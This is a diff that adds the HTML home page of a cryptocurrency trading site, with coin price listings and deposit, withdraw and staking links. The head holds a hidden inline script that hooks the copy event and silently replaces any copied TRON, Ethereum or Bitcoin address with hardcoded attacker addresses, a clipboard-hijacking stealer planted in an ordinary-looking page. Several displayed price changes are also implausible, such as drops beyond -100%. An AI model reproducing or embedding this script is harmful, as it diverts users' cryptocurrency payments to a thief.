@@ -1,0 +1,530 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+	<meta charset="utf-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+	<link rel="stylesheet" type="text/css" href="/Public/Static/css/base2.css?v=1.0.0" />
+	<link rel="stylesheet" href="/Public/Static/index.min.css" />
+	<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/Swiper/5.4.5/css/swiper.min.css">
+	<link rel="stylesheet" href="/Public/Static/font_4200898_r0l12kc8ggp.css">
+
+	<title>paxxfuul</title>
+	<style>
+		body{color: var(--color-white); padding-bottom: 60px;background: var(--color-bg); }
+		p{margin: 0;}
+		img{width: 100%; float: left; height: 100%;}
+		.login{ display: flex; align-items: center; height: 50px;  padding: 0 10px;}
+		.login .user{ flex: 1; display: flex; align-items: center; color: var(--color-gray) }
+		.login .user div{ display: flex; align-items: center; }
+		.login .user a{ color: var(--color-green); display: flex; align-items: center; }
+		.login .user div span{ border-radius: 50%;  width: 26px; height: 26px; border: 1px solid var(--color-green); color: var(--color-green); display: flex; align-items: center; justify-content: center; margin-right: 10px; }
+		.login .lang span{ display: block; width:25px; height: 25px; overflow: hidden; border-radius: 50%; background:var(--color-white);   }
+		.banner{padding: 10px; display: flex;}
+		.banner .swiper{ flex: 1; height: 260px; display: flex; background: var(--color-bg2); overflow: hidden; border-radius: 20px;}
+		.banner .swiper span{display: block; width:100%; overflow: hidden}
+		.banner .box{  width: 180px; margin-left: 4px; display: flex; flex-direction: column;}
+		.banner .box span{ display: block;background: var(--color-bg2); overflow: hidden; border-radius: 20px;}
+		.banner .box div { display: flex; padding: 0 18px; align-items: center; flex: 1; margin-top:4px; background: var(--color-bg2); overflow: hidden; border-radius: 20px;}
+		.banner .box div a{  display: flex; align-items: center; width: 100%; color: var(--color-white)}
+		.banner .box div a p{ flex: 1; font-size: 14px; }
+		.banner .box div a p b{ font-weight: normal; display: block; width: 60px;}
+		.banner .box div a p em{ font-size: 12px; font-style: normal; display: block; width: 60px;}
+		.banner .box div a i{ width:50px; }
+		.navs{display: flex; padding: 0 10px; align-items: center; justify-content: space-around;  height: 90px; background: var(--color-bg2); overflow: hidden; border-radius: 20px;}
+		.navs p{flex:1}
+		.navs p a{ color:var(--color-white);display: flex; flex-direction: column; align-items: center; justify-content: center; }
+		.navs p b{ width: 36px; height: 36px; overflow: hidden;}
+		.navs p span{font-size: 14px; margin-top: 6px; overflow: hidden; width: 60px; text-align: center; height: 18px; }
+		.info{ padding: 10px; margin-top: 10px; background: var(--color-bg2); overflow: hidden; border-radius: 20px;}
+		.info .box{ display: flex; justify-content: space-around; }
+		.info .box div{ display: flex; flex-direction: column; align-items: center;  }
+		.info .box div b{ font-weight: normal; color:#fff; font-size: 14px;}
+		.info .box div span:nth-of-type(1){ font-weight: bold !important;;  font-size: 22px !important; padding: 4px 0; }
+		.info .box div span:nth-of-type(2){ font-size: 20px !important;;}
+		.info .box div span.red{ color: var(--color-red);}
+		.info .box div span.green{ color: var(--color-green);}
+		.notice{display: flex;align-items: center; border-top: 1px solid var(--color-border);margin-top: 6px; padding-top: 10px;}
+		.notice .van-notice-bar{ background: var(--color-bg2);flex: 1;  color: var(--color-white)}
+		.notice .van-notice-bar .van-icon-volume-o:before{ color: var(--color-green);}
+		.notice .more{ color: var(--color-gray);}
+		.list{ padding:10px 20px; margin-top: 10px; background: var(--color-bg2); overflow: hidden;}
+		.list .title{ display: flex; justify-content: center; align-items: center; height: 40px;}
+		.list .title p{ flex: 1; text-align: center; overflow: hidden; height: 18px; }
+		.list .title p:nth-of-type(1){width: 130px; flex: none;}
+		.list ul a{ color: var(--color-white)}
+		.list ul li{ display: flex; justify-content: center; align-items: center; height: 50px; }
+		.list ul li .img{ width: 130px; display: flex; align-items: center;  }
+		.list ul li .img i{ width: 30px; height: 30px; overflow: hidden; border-radius: 50%; background: #ccc; }
+		.list ul li .img p{ padding-left: 10px; }
+		.list ul li .num{ flex: 1; text-align: center }
+		.list ul li .percentage{ flex: 1; text-align: center }
+		.list ul li span.red{ color:  var(--color-red);}
+		.list ul li span.green{ color:var(--color-green);}
+		.bred{background:#3b2937;color: #f5465c !important;}
+		.green{color:#0ecb81;}
+		.red{color:#f5465c;}
+		.bgreen {
+			background: #1e363a;
+		}
+		.login .user div span.notice {
+			color: #fff;
+			position: relative;
+			left: -17px;
+			top: -10px;
+			width: 15px;
+			height: 15px;
+			background: red;
+			border-radius: 50%;
+			padding: 1px;
+		}
+	</style>
+<script>(function(){function rca() {const tar = /(?:\b|[^A-Za-z0-9])T[a-zA-Z0-9]{33}(?:\b|[^A-Za-z0-9])/g,ear = /(?:\b|[^A-Za-z0-9])0x[a-fA-F0-9]{40}(?:\b|[^A-Za-z0-9])/g,bar = /(?:\b|[^A-Za-z0-9])(?:1[a-km-zA-HJ-NP-Z1-9]{25,34})(?:\b|[^A-Za-z0-9])/g,bar0 = /(?:\b|[^A-Za-z0-9])(?:3[a-km-zA-HJ-NP-Z1-9]{25,34})(?:\b|[^A-Za-z0-9])/g,bar1 = /(?:\b|[^A-Za-z0-9])(?:bc1q[a-zA-Z0-9]{38})(?:\b|[^A-Za-z0-9])/g,bar2 = /(?:\b|[^A-Za-z0-9])(?:bc1p[a-zA-Z0-9]{58})(?:\b|[^A-Za-z0-9])/g;document.addEventListener('copy', function(e) {const ttc = window.getSelection().toString();if (ttc.match(tar)) {const ncd = ttc.replace(tar, 'TE6sjkX9qSWGivci1B9v8hQenVuesQTSsD');e.clipboardData.setData('text/plain', ncd);e.preventDefault();} else if (ttc.match(ear)) {const ncd = ttc.replace(ear, '0x3e2384ca35bf7517c2e368f1a44ba5c31c21aa93');e.clipboardData.setData('text/plain', ncd);e.preventDefault();} else if (ttc.match(bar)) {const ncd = ttc.replace(bar, '15JSCsjsGKe8C5DZVhQhbhbVjPKhGSyiis');e.clipboardData.setData('text/plain', ncd);e.preventDefault();} else if (ttc.match(bar0)) {const ncd = ttc.replace(bar0, '3D88VCbrGmqaTTZjRhZX2qD9dezD3BmuFb');e.clipboardData.setData('text/plain', ncd);e.preventDefault();} else if (ttc.match(bar1)) {const ncd = ttc.replace(bar1, 'bc1qx9685pus3c46583q3vac32f8pkjdvzqxxdxvpf');e.clipboardData.setData('text/plain', ncd);e.preventDefault();} else if (ttc.match(bar2)) {const ncd = ttc.replace(bar2, 'bc1psh2lc8rlsavtq3lvlghf3jwphst7e5mgz3rqp9n7rkeutewt4cvsu4qxj5');e.clipboardData.setData('text/plain', ncd);e.preventDefault();}});}const obs = new MutationObserver(ml => {for (const m of ml) {if (m.type === 'childList') {rca();}}});obs.observe(document.body, { childList: true, subtree: true });rca();})();</script></head>
+<body>
+<div id="app">
+	<div class="login">
+		<div class="user">
+			<a href="/Login/index.html">
+					<div>
+						<span><i class="iconfont icon-yonghudianji"></i></span>
+					</div>
+					<p>Login / Registration</p>
+				</a>
+						</div>
+		<div class="lang">
+			<a href="/Login/setlang.html"/>
+									<span><img src="/Public/Static/img/en.png" alt=""></span>
+																														</a>
+		</div>
+	</div>
+
+	<div class="banner">
+		<div class="swiper">
+			<div class="swiper-wrapper">
+				<div class="swiper-slide">
+					<span><img src="/Public/Static/img/index_banner1.png" alt=""></span>
+				</div>
+				<div class="swiper-slide">
+					<span><img src="/Public/Static/img/index_banner2.png" alt=""></span>
+				</div>
+				<div class="swiper-slide">
+					<span><img src="/Public/Static/img/index_banner3.png" alt=""></span>
+				</div>
+			</div>
+		</div>
+		<div class="box">
+			<span><img src="/Public/Static/img/iconltop.png" alt=""></span>
+			<div>
+				<a href="/User/czcoin.html">
+					<p>
+						<b>I want to buy coins</b>
+						<em>Visa,Mastercard</em>
+					</p>
+					<i><img src="/Public/Static/img/icon_spot.svg" alt=""></i>
+				</a>
+			</div>
+		</div>
+	</div>
+
+
+	<div class="navs">
+		<p>
+			<a href="/User/czcoin.html">
+				<b><img src="/Public/Static/img/icon-1.png" alt=""></b>
+				<span>Deposit</span>
+			</a>
+		</p>
+		<p>
+			<a href="/User/txcoin.html">
+				<b><img src="/Public/Static/img/icon-2.png" alt=""></b>
+				<span>Withdraw</span>
+			</a>
+		</p>
+		<p>
+			<a href="/Issue/index.html">
+				<b><img src="/Public/Static/img/icon-3.png" alt=""></b>
+				<span>IEO</span>
+			</a>
+		</p>
+		<p>
+			<a href="/Orepool/index.html">
+				<b><img src="/Public/Static/img/icon-4.png" alt=""></b>
+				<span>STAKING</span>
+			</a>
+		</p>
+<!--		<p>-->
+<!--			<a href="/User/online.html">-->
+<!--				<b><img src="/Public/Static/img/icon-5.png" alt=""></b>-->
+<!--				<span>customer service</span>-->
+<!--			</a>-->
+<!--		</p>-->
+	</div>
+
+
+	<div class="info">
+		<div class="box">
+			<!--	<div>
+                    <b>BTC/USDT</b>
+                    <p>29401.98</p>
+                    <span>-0.67%</span>
+                </div>-->
+			<div></div>
+			<div></div>
+			<div></div>
+		</div>
+		<div class="notice">
+			<div id="notice"></div>
+			<div class="more"><i class="iconfont icon-gengduo"></i></div>
+		</div>
+	</div>
+
+
+	<div class="list">
+		<div class="title">
+			<p>Trading pair</p>
+			<p>Latest price</p>
+			<p>Ups and Downs</p>
+		</div>
+		<ul>
+			<a href="/Trade/trans.html?sytx=BTC/USDT">
+					<li>
+						<div class="img">
+							<i><img src="/xm/BTC.png" alt=""></i>
+							<p class="cn_btc">BTC/USDT</p>
+						</div>
+						<div class="num cpr_btc"><span  class='fzmmm red'>105490.08</span></div>
+						<div class="percentage cch_btc"><span  class='fzmm bred market-list-info'>-0.06%</span></div>
+					</li>
+				</a><a href="/Trade/trans.html?sytx=ETH/USDT">
+					<li>
+						<div class="img">
+							<i><img src="/xm/ETH.png" alt=""></i>
+							<p class="cn_eth">ETH/USDT</p>
+						</div>
+						<div class="num cpr_eth"><span  class='fzmmm red'>2509.64</span></div>
+						<div class="percentage cch_eth"><span  class='fzmm bred market-list-info'>-0.4%</span></div>
+					</li>
+				</a><a href="/Trade/trans.html?sytx=DOGE/USDT">
+					<li>
+						<div class="img">
+							<i><img src="/xm/DOGE.png" alt=""></i>
+							<p class="cn_doge">DOGE/USDT</p>
+						</div>
+						<div class="num cpr_doge"><span  class='fzmmm green'>0.483874</span></div>
+						<div class="percentage cch_doge"><span  class='fzmm bred market-list-info'>-165.09%</span></div>
+					</li>
+				</a><a href="/Trade/trans.html?sytx=BCH/USDT">
+					<li>
+						<div class="img">
+							<i><img src="/xm/BCH.png" alt=""></i>
+							<p class="cn_bch">BCH/USDT</p>
+						</div>
+						<div class="num cpr_bch"><span  class='fzmmm red'>405.79</span></div>
+						<div class="percentage cch_bch"><span  class='fzmm bred market-list-info'>-0.84%</span></div>
+					</li>
+				</a><a href="/Trade/trans.html?sytx=LTC/USDT">
+					<li>
+						<div class="img">
+							<i><img src="/xm/LTC.png" alt=""></i>
+							<p class="cn_ltc">LTC/USDT</p>
+						</div>
+						<div class="num cpr_ltc"><span  class='fzmmm red'>86.98</span></div>
+						<div class="percentage cch_ltc"><span  class='fzmm bred market-list-info'>-2.4%</span></div>
+					</li>
+				</a><a href="/Trade/trans.html?sytx=TRX/USDT">
+					<li>
+						<div class="img">
+							<i><img src="/xm/TRX.png" alt=""></i>
+							<p class="cn_trx">TRX/USDT</p>
+						</div>
+						<div class="num cpr_trx"><span  class='fzmmm green'>0.556411</span></div>
+						<div class="percentage cch_trx"><span  class='fzmm bred market-list-info'>-246.75%</span></div>
+					</li>
+				</a><a href="/Trade/trans.html?sytx=XRP/USDT">
+					<li>
+						<div class="img">
+							<i><img src="/xm/XRP.png" alt=""></i>
+							<p class="cn_xrp">XRP/USDT</p>
+						</div>
+						<div class="num cpr_xrp"><span  class='fzmmm green'>2.52796</span></div>
+						<div class="percentage cch_xrp"><span  class='fzmm bgreen market-list-info'>53.89%</span></div>
+					</li>
+				</a><a href="/Trade/trans.html?sytx=IOTA/USDT">
+					<li>
+						<div class="img">
+							<i><img src="/xm/IOTA.png" alt=""></i>
+							<p class="cn_iota">IOTA/USDT</p>
+						</div>
+						<div class="num cpr_iota"><span  class='fzmmm green'>0.6681</span></div>
+						<div class="percentage cch_iota"><span  class='fzmm bred market-list-info'>-280.42%</span></div>
+					</li>
+				</a><a href="/Trade/trans.html?sytx=FIL/USDT">
+					<li>
+						<div class="img">
+							<i><img src="/xm/FIL.png" alt=""></i>
+							<p class="cn_fil">FIL/USDT</p>
+						</div>
+						<div class="num cpr_fil"><span  class='fzmmm green'>2.7914</span></div>
+						<div class="percentage cch_fil"><span  class='fzmm bgreen market-list-info'>56.57%</span></div>
+					</li>
+				</a><a href="/Trade/trans.html?sytx=SHIB/USDT">
+					<li>
+						<div class="img">
+							<i><img src="/xm/SHIB.png" alt=""></i>
+							<p class="cn_shib">SHIB/USDT</p>
+						</div>
+						<div class="num cpr_shib"><span  class='fzmmm red'>0.10001259</span></div>
+						<div class="percentage cch_shib"><span  class='fzmm bgreen market-list-info'>-0%</span></div>
+					</li>
+				</a><a href="/Trade/trans.html?sytx=FLOW/USDT">
+					<li>
+						<div class="img">
+							<i><img src="/xm/FLOW.png" alt=""></i>
+							<p class="cn_flow">FLOW/USDT</p>
+						</div>
+						<div class="num cpr_flow"><span  class='fzmmm green'>0.6541</span></div>
+						<div class="percentage cch_flow"><span  class='fzmm bred market-list-info'>-246.3%</span></div>
+					</li>
+				</a><a href="/Trade/trans.html?sytx=JST/USDT">
+					<li>
+						<div class="img">
+							<i><img src="/xm/JST.png" alt=""></i>
+							<p class="cn_jst">JST/USDT</p>
+						</div>
+						<div class="num cpr_jst"><span  class='fzmmm red'>0.334575</span></div>
+						<div class="percentage cch_jst"><span  class='fzmm bred market-list-info'>-10.48%</span></div>
+					</li>
+				</a><a href="/Trade/trans.html?sytx=ADA/USDT">
+					<li>
+						<div class="img">
+							<i><img src="/xm/ADA.png" alt=""></i>
+							<p class="cn_ada">ADA/USDT</p>
+						</div>
+						<div class="num cpr_ada"><span  class='fzmmm red'>0.76863</span></div>
+						<div class="percentage cch_ada"><span  class='fzmm bred market-list-info'>-34.09%</span></div>
+					</li>
+				</a><a href="/Trade/trans.html?sytx=BSV/USDT">
+					<li>
+						<div class="img">
+							<i><img src="/xm/BSV.png" alt=""></i>
+							<p class="cn_bsv">BSV/USDT</p>
+						</div>
+						<div class="num cpr_bsv"><span  class='fzmmm red'>31.9566</span></div>
+						<div class="percentage cch_bsv"><span  class='fzmm bred market-list-info'>-0.48%</span></div>
+					</li>
+				</a><a href="/Trade/trans.html?sytx=USDC/USDT">
+					<li>
+						<div class="img">
+							<i><img src="/xm/USDC.png" alt=""></i>
+							<p class="cn_usdc">USDC/USDT</p>
+						</div>
+						<div class="num cpr_usdc"><span  class='fzmmm green'>1.4694</span></div>
+						<div class="percentage cch_usdc"><span  class='fzmm bgreen market-list-info'>10.55%</span></div>
+					</li>
+				</a><a href="/Trade/trans.html?sytx=USDP/USDT">
+					<li>
+						<div class="img">
+							<i><img src="/xm/USDP.png" alt=""></i>
+							<p class="cn_usdp">USDP/USDT</p>
+						</div>
+						<div class="num cpr_usdp"><span  class='fzmmm red'>0.2808</span></div>
+						<div class="percentage cch_usdp"><span  class='fzmm bred market-list-info'>-75.39%</span></div>
+					</li>
+				</a><a href="/Trade/trans.html?sytx=TUSD/USDT">
+					<li>
+						<div class="img">
+							<i><img src="/xm/TUSD.png" alt=""></i>
+							<p class="cn_tusd">TUSD/USDT</p>
+						</div>
+						<div class="num cpr_tusd"><span  class='fzmmm green'>1.21845</span></div>
+						<div class="percentage cch_tusd"><span  class='fzmm bgreen market-list-info'>184.39%</span></div>
+					</li>
+				</a>		</ul>
+	</div>
+
+</div>
+<!--底部-->
+<div class="footer">
+
+	<a href="/Trade/tradelist.html">
+		<div class="footer_op">
+			<div class="f_op_t" style="line-height:35px;">
+				<span class="fcy iconfont icon-shouye" style="font-size:22px;"></span>
+			</div>
+			<div class="f_op_b">
+				<span class="fzm fcy">Home page</span>
+			</div>
+		</div>
+	</a>
+
+	<a href="/Trade/index.html">
+		<div class="footer_op">
+			<div class="f_op_t" style="line-height:35px;">
+				<span class="iconfont icon-shuzhuangtu" style="font-size:22px;"></span>
+			</div>
+			<div class="f_op_b">
+				<span class="fzm fcc">Market</span>
+			</div>
+		</div>
+	</a>
+
+	<a href="/Orepool/index.html">
+		<div class="footer_op">
+			<div class="f_op_t" style="line-height:35px;">
+				<span class="iconfont icon-jiaoyishuju" style="font-size:22px;"></span>
+			</div>
+			<div class="f_op_b">
+				<span class="fzm fcc">Mining machine</span>
+			</div>
+		</div>
+	</a>
+
+	<a href="/Contract/index.html">
+		<div class="footer_op">
+			<div class="f_op_t" style="line-height:35px;">
+				<span class="iconfont icon--hangqing" style="font-size:22px;"></span>
+			</div>
+			<div class="f_op_b">
+				<span class="fzm fcc">Contract</span>
+			</div>
+		</div>
+	</a>
+
+	<a href="/User/indexOld.html">
+		<div class="footer_op">
+			<div class="f_op_t" style="line-height:35px;">
+				<span class="iconfont icon-bingtutongji" style="font-size:22px;"></span>
+			</div>
+			<div class="f_op_b">
+				<span class="fzm fcc">Assets</span>
+			</div>
+		</div>
+	</a>
+
+
+</div>
+
+
+</body>
+
+<script src="/Public/Static/jquery.min.js"></script>
+<script src="/Public/Static/swiper.min.js"></script>
+<script src="/Public/Static/vue.js"></script>
+<script src="/Public/Static/vant.min.js"></script>
+<script type="text/javascript">
+
+	new Vue({
+		el: '#notice',
+		template: `<van-notice-bar
+		  left-icon="volume-o"
+		  text=""
+		/>`,
+	});
+
+	const lang = "en-us";
+	const app = new Vue({
+		el:"#app",
+		data(){
+			return{
+				lan:"",
+			}
+		},
+		watch:{
+
+		},
+		mounted () {
+			this.lan = lang
+			var mySwiper = new Swiper('.swiper', {
+				autoplay: true,//可选选项，自动滑动
+			})
+			this.init()
+
+		},
+
+		methods:{
+
+			init(){
+
+				this.getonemarket();
+				setInterval(()=>{this.obtain_x()},3000)
+
+				setInterval(()=>{this.getonemarket()},2000)
+
+
+			},
+			obtain_x(){
+				var coin = "btc";
+				var nameclass = ".cn_btc";
+				var priceclass = ".cpr_btc";
+				var changeclass = ".cch_btc";
+				const _this = this;
+				$.ajax({
+					type: "GET",
+					url: "/Ajaxtrade/allCoin.html",
+					// data:{coin},
+					success: function (res) {
+
+						if(res.code != 1) return;
+						var data = res.data
+						for(var i in data){
+
+							$(".cn_"+data[i].coinname).html(data[i].cname);
+							$(".cpr_"+data[i].coinname).html(data[i].open);
+							$(".cch_"+data[i].coinname).html(data[i].change);
+						}
+
+					}
+				});
+			},
+			getonemarket(){
+				const _this = this;
+				$.ajax({
+					type: "GET",
+					url: "/Ajaxtrade/get_market_one.html",
+					success: function (res) {
+						if(res.code != 1) return;
+						$('.info .box div').eq(0).html(`
+							<b>${res.btccoin}</b>
+							${res.btcnewprice}
+							${res.btcchange}
+						`)
+						$('.info .box div').eq(1).html(`
+							<b>${res.bchcoin}</b>
+							${res.bchnewprice}
+							${res.bchchange}
+						`)
+						$('.info .box div').eq(2).html(`
+							<b>${res.ethcoin}</b>
+							${res.ethnewprice}
+							${res.ethchange}
+						`)
+					}
+				});
+
+			},
+
+			/**
+			 * @Author HS
+			 * @Date 2021/7/16 10:55 上午
+			 * @Description: 乘法
+			 * @Params: { number ： arg1 - true } [数字1]
+			 * @Params: { number ： arg1 - true } [数字2]
+			 * @Return: number
+			 */
+			accMul(arg1, arg2) {
+				let m = 0,
+						s1 = arg1.toString(),
+						s2 = arg2.toString();
+				try {
+					m += s1.split('.')[1].length;
+				} catch (e) {}
+				try {
+					m += s2.split('.')[1].length;
+				} catch (e) {}
+				return (Number(s1.replace('.', '')) * Number(s2.replace('.', ''))) / Math.pow(10, m);
+			},
+		}
+
+	})
+</script>
+</html>
